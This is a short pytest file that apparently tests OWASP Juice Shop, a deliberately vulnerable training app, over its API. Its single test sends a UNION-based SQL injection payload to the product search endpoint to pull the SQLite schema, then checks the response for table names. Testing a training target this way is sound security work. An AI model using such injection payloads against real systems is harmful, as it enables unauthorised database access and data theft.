import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest
import requests


@pytest.mark.api
def test_ct04_database_schema(api_headers, config):
    base_url = config['url'].replace('http://localhost:3000', 'https://juice-shop.herokuapp.com')
    url = f"{base_url}/rest/products/search?q=apple')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master --"
    response = requests.get(url, headers=api_headers)
    
    assert response.status_code == config['status']
    
    body = response.text
    assert "CREATE TABLE" in body
    assert any(keyword in body for keyword in ["Users", "Products", "Feedback", "BasketItems"])


if __name__ == "__main__":
    import os
    os.chdir(Path(__file__).parent.parent)
    pytest.main([__file__, "-v"])
